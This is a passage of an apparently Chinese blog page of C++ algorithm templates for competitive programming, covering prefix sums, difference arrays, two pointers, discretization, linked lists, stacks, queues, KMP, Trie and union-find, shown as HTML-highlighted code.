class="hljs-title">div</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> &amp;r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br>    r = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = A.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>    &#123;<br>        r = r * <span class="hljs-number">10</span> + A[i];<br>        C.push_back(r / b);<br>        r %= b;<br>    &#125;<br>    reverse(C.begin(), C.end());<br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-9-一维前缀和"><a href="#1-9-一维前缀和" class="headerlink" title="1.9 一维前缀和"></a>1.9 一维前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">S[i] = a[<span class="hljs-number">1</span>] + a[<span class="hljs-number">2</span>] + ... a[i]<br>a[l] + ... + a[r] = S[r] - S[l - <span class="hljs-number">1</span>]<br></code></pre></div></td></tr></table></figure><h3 id="1-10-二维前缀和"><a href="#1-10-二维前缀和" class="headerlink" title="1.10 二维前缀和"></a>1.10 二维前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">S[i, j] = 第i行j列格子左上部分所有元素的和<br>以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：<br>S[x2, y2] - S[x1 - <span class="hljs-number">1</span>, y2] - S[x2, y1 - <span class="hljs-number">1</span>] + S[x1 - <span class="hljs-number">1</span>, y1 - <span class="hljs-number">1</span>]<br></code></pre></div></td></tr></table></figure><h3 id="1-11-一维差分"><a href="#1-11-一维差分" class="headerlink" title="1.11 一维差分"></a>1.11 一维差分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给区间[l, r]中的每个数加上c：B[l] += c, B[r + <span class="hljs-number">1</span>] -= c<br></code></pre></div></td></tr></table></figure><h3 id="1-12-二分差分"><a href="#1-12-二分差分" class="headerlink" title="1.12 二分差分"></a>1.12 二分差分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：<br>S[x1, y1] += c, S[x2 + <span class="hljs-number">1</span>, y1] -= c, S[x1, y2 + <span class="hljs-number">1</span>] -= c, S[x2 + <span class="hljs-number">1</span>, y2 + <span class="hljs-number">1</span>] += c<br></code></pre></div></td></tr></table></figure><h3 id="1-13-位运算"><a href="#1-13-位运算" class="headerlink" title="1.13 位运算"></a>1.13 位运算</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">求n的第k位数字: n &gt;&gt; k &amp; <span class="hljs-number">1</span><br>返回n的最后一位<span class="hljs-number">1</span>：lowbit(n) = n &amp; -n<br></code></pre></div></td></tr></table></figure><h3 id="1-14-双指针"><a href="#1-14-双指针" class="headerlink" title="1.14 双指针"></a>1.14 双指针</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (j &lt; i &amp;&amp; check(i, j)) j ++ ;<br><br>    <span class="hljs-comment">// 具体问题的逻辑</span><br>&#125;<br>常见问题分类：<br>    (<span class="hljs-number">1</span>) 对于一个序列，用两个指针维护一段区间<br>    (<span class="hljs-number">2</span>) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作<br></code></pre></div></td></tr></table></figure><h3 id="1-15-离散发"><a href="#1-15-离散发" class="headerlink" title="1.15 离散发"></a>1.15 离散发</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; alls; <span class="hljs-comment">// 存储所有待离散化的值</span><br>sort(alls.begin(), alls.end()); <span class="hljs-comment">// 将所有值排序</span><br>alls.erase(unique(alls.begin(), alls.end()), alls.end());   <span class="hljs-comment">// 去掉重复元素</span><br><br><span class="hljs-comment">// 二分求出x对应的离散化的值</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> <span class="hljs-comment">// 找到第一个大于等于x的位置</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-keyword">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// 映射到1, 2, ...n</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-16-区间和并"><a href="#1-16-区间和并" class="headerlink" title="1.16 区间和并"></a>1.16 区间和并</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 将所有存在交集的区间合并</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;PII&gt; &amp;segs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;PII&gt; res;<br><br>    sort(segs.begin(), segs.end());<br><br>    <span class="hljs-keyword">int</span> st = <span class="hljs-number">-2e9</span>, ed = <span class="hljs-number">-2e9</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> seg : segs)<br>        <span class="hljs-keyword">if</span> (ed &lt; seg.first)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br>            st = seg.first, ed = seg.second;<br>        &#125;<br>        <span class="hljs-keyword">else</span> ed = max(ed, seg.second);<br><br>    <span class="hljs-keyword">if</span> (st != <span class="hljs-number">-2e9</span>) res.push_back(&#123;st, ed&#125;);<br><br>    segs = res;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="二-数据结构"><a href="#二-数据结构" class="headerlink" title="二.数据结构"></a>二.数据结构</h2><h3 id="2-1-单链表"><a href="#2-1-单链表" class="headerlink" title="2.1 单链表"></a>2.1 单链表</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点</span><br><span class="hljs-keyword">int</span> head, e[N], ne[N], idx;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head = <span class="hljs-number">-1</span>;<br>    idx = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 在链表头插入一个数a</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx] = a, ne[idx] = head, head = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 将头结点删除，需要保证头结点存在</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head = ne[head];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-双链表"><a href="#2-2-双链表" class="headerlink" title="2.2 双链表"></a>2.2 双链表</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点</span><br><span class="hljs-keyword">int</span> e[N], l[N], r[N], idx;<br><br><span class="hljs-comment">// 初始化</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//0是左端点，1是右端点</span><br>    r[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>, l[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    idx = <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-comment">// 在节点a的右边插入一个数x</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx] = x;<br>    l[idx] = a, r[idx] = r[a];<br>    l[r[a]] = idx, r[a] = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 删除节点a</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    l[r[a]] = l[a];<br>    r[l[a]] = r[a];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-3-栈"><a href="#2-3-栈" class="headerlink" title="2.3 栈"></a>2.3 栈</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// tt表示栈顶</span><br><span class="hljs-keyword">int</span> stk[N], tt = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 向栈顶插入一个数</span><br>stk[ ++ tt] = x;<br><br><span class="hljs-comment">// 从栈顶弹出一个数</span><br>tt -- ;<br><br><span class="hljs-comment">// 栈顶的值</span><br>stk[tt];<br><br><span class="hljs-comment">// 判断栈是否为空</span><br><span class="hljs-keyword">if</span> (tt &gt; <span class="hljs-number">0</span>)<br>&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-队列"><a href="#2-4-队列" class="headerlink" title="2.4 队列"></a>2.4 队列</h3><h4 id="2-4-1-普通队列"><a href="#2-4-1-普通队列" class="headerlink" title="2.4.1 普通队列"></a>2.4.1 普通队列</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// hh 表示队头，tt表示队尾</span><br><span class="hljs-keyword">int</span> q[N], hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">// 向队尾插入一个数</span><br>q[ ++ tt] = x;<br><br><span class="hljs-comment">// 从队头弹出一个数</span><br>hh ++ ;<br><br><span class="hljs-comment">// 队头的值</span><br>q[hh];<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-keyword">if</span> (hh &lt;= tt)<br>&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-4-2-循环队列"><a href="#2-4-2-循环队列" class="headerlink" title="2.4.2 循环队列"></a>2.4.2 循环队列</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// hh 表示队头，tt表示队尾的后一个位置</span><br><span class="hljs-keyword">int</span> q[N], hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 向队尾插入一个数</span><br>q[tt ++ ] = x;<br><span class="hljs-keyword">if</span> (tt == N) tt = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 从队头弹出一个数</span><br>hh ++ ;<br><span class="hljs-keyword">if</span> (hh == N) hh = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 队头的值</span><br>q[hh];<br><br><span class="hljs-comment">// 判断队列是否为空</span><br><span class="hljs-keyword">if</span> (hh != tt)<br>&#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-5-单调栈"><a href="#2-5-单调栈" class="headerlink" title="2.5 单调栈"></a>2.5 单调栈</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">常见模型：找出每个数左边离它最近的比它大/小的数<br><span class="hljs-keyword">int</span> tt = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (tt &amp;&amp; check(stk[tt], i)) tt -- ;<br>    stk[ ++ tt] = i;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-6-单调队列"><a href="#2-6-单调队列" class="headerlink" title="2.6 单调队列"></a>2.6 单调队列</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">常见模型：找出滑动窗口中的最大值/最小值<br><span class="hljs-keyword">int</span> hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (hh &lt;= tt &amp;&amp; check_out(q[hh])) hh ++ ;  <span class="hljs-comment">// 判断队头是否滑出窗口</span><br>    <span class="hljs-keyword">while</span> (hh &lt;= tt &amp;&amp; check(q[tt], i)) tt -- ;<br>    q[ ++ tt] = i;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-7-KMP"><a href="#2-7-KMP" class="headerlink" title="2.7 KMP"></a>2.7 KMP</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度</span><br>求模式串的Next数组：<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>, j = <span class="hljs-number">0</span>; i &lt;= m; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];<br>    <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) j ++ ;<br>    ne[i] = j;<br>&#125;<br><br><span class="hljs-comment">// 匹配</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt;= n; i ++ )<br>&#123;<br>    <span class="hljs-keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];<br>    <span class="hljs-keyword">if</span> (s[i] == p[j + <span class="hljs-number">1</span>]) j ++ ;<br>    <span class="hljs-keyword">if</span> (j == m)<br>    &#123;<br>        j = ne[j];<br>        <span class="hljs-comment">// 匹配成功后的逻辑</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-8-Trie树"><a href="#2-8-Trie树" class="headerlink" title="2.8 Trie树"></a>2.8 Trie树</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> son[N][<span class="hljs-number">26</span>], cnt[N], idx;<br><span class="hljs-comment">// 0号点既是根节点，又是空节点</span><br><span class="hljs-comment">// son[][]存储树中每个节点的子节点</span><br><span class="hljs-comment">// cnt[]存储以每个节点结尾的单词数量</span><br><br><span class="hljs-comment">// 插入一个字符串</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; str[i]; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!son[p][u]) son[p][u] = ++ idx;<br>        p = son[p][u];<br>    &#125;<br>    cnt[p] ++ ;<br>&#125;<br><br><span class="hljs-comment">// 查询字符串出现的次数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; str[i]; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        p = son[p][u];<br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-9-并查集"><a href="#2-9-并查集" class="headerlink" title="2.9 并查集"></a>2.9 并查集</h3><h4 id="2-9-1-朴素并查集"><a href="#2-9-1-朴素并查集" class="headerlink" title="2.9.1 朴素并查集"></a>2.9.1 朴素并查集</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> p[N]; <span class="hljs-comment">//存储每个点的祖宗节点</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ ) p[i] = i;<br><br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>p[find(a)] = find(b);<br></code></pre></div></td></tr></table></figure><h4 id="2-9-2-维护大小size的并查集"><a href="#2-9-2-维护大小size的并查集" class="headerlink" title="2.9.2 维护大小size的并查集"></a>2.9.2 维护大小size的并查集</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> p[N], size[N];<br><span class="hljs-comment">//p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    size[i] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>size[find(b)] += size[find(a)];<br>p[find(a)] = find(b);<br></code></pre></div></td></tr></table></figure><h4 id="2-9-3-维护到祖宗节点距离的并查集"><a href="#2-9-3-维护到祖宗节点距离的并查集" class="headerlink" title="2.9.3 维护到祖宗节点距离的并查集"></a>2.9.3 维护到祖宗节点距离的并查集</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> p[N], d[N];<br><span class="hljs-comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离</span><br><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x)<br>    &#123;<br>        <span class="hljs-keyword">int</span> u = find(p[x]);<br>        d[x] += d[p[x]];<br>        p[x] = u;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    p[i] = i;<br>    d[i] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>p[find(a)] = find(b);<br>d[find(a)] = distance; <span class="hljs-comment">// 根据具体问题，初始化find(a)的偏移量</span><br></code></pre></div></td></tr></table></figure><h3 id="2-10-堆"><a href="#2-10-堆" class="headerlink" title="2.10 堆"></a>2.10 堆</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 